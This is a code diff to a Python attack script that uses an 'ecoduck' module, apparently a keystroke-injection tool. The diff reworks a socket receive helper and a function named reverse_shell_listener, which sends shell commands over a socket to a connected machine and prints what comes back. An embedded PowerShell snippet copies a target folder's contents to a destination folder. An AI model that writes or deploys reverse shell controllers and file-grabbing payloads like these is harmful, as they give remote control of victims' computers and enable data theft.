@@ -1,6 +1,6 @@
 from ecoduck import eco
 
-import os,signal,io,http.server,socketserver,socket,struct,sys,time
+import os,signal,io,http.server,socketserver,socket,time
 from time import sleep
 from subprocess import Popen, PIPE, check_output
 
@@ -15,26 +15,27 @@ ls $target
 Copy-Item -Path $target\\* -Destination $destinationFolder -recurse -Force
 Write-Host "The file sync is complete." """
 
-def recv_timeout(the_socket,timeout=2):
-    the_socket.setblocking(0)
-    total_data=[];data='';begin=time.time()
-    while 1:
-        #if you got some data, then break after wait sec
-        if total_data and time.time()-begin>timeout:
-            break
-        #if you got no data at all, wait a little longer
-        elif time.time()-begin>timeout*2:
-            break
-        try:
-            data=the_socket.recv(8192)
-            if data:
-                total_data.append(data)
-                begin=time.time()
-            else:
-                time.sleep(0.1)
-        except:
-            pass
-    return ''.join(total_data)
+def recv_timeout(the_socket,timeout=1): # Receives from socket with a timeout
+	the_socket.setblocking(0) # Stops socket from blocking code execution
+	total_data="";data='';begin=time.time()
+	while 1:
+		#if you got some data, then break after wait sec
+		if total_data and time.time()-begin>timeout:
+			break
+		#if you got no data at all, wait a little longer
+		elif time.time()-begin>timeout*2:
+			break
+		try:
+			data=the_socket.recv(32) # recieve data
+			if data:
+				strdata=data.decode("utf-8") # Decode data to string
+				total_data += strdata # Add to total data
+				begin=time.time() # Reset timer
+			else:
+				time.sleep(0.1) # Sleep before checking again
+		except:
+			pass
+	return total_data # Return all data
 
 def reverse_shell_listener():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create our socket handler.
@@ -50,7 +51,7 @@ def reverse_shell_listener():
 		for line in codelines:
 			print("Sending: " + line)
 			conn.send(bytes(line + "\n\r", "UTF-8")) # Send shell command.
-			data = recv_timeout(conn).decode("UTF-8") # Receive output from command.
+			data = recv_timeout(conn) # Receive output from command.
 			print(data) # Print the output of the command.
 	except KeyboardInterrupt: 
 		print("...listener terminated using [ctrl+c], Shutting down!")
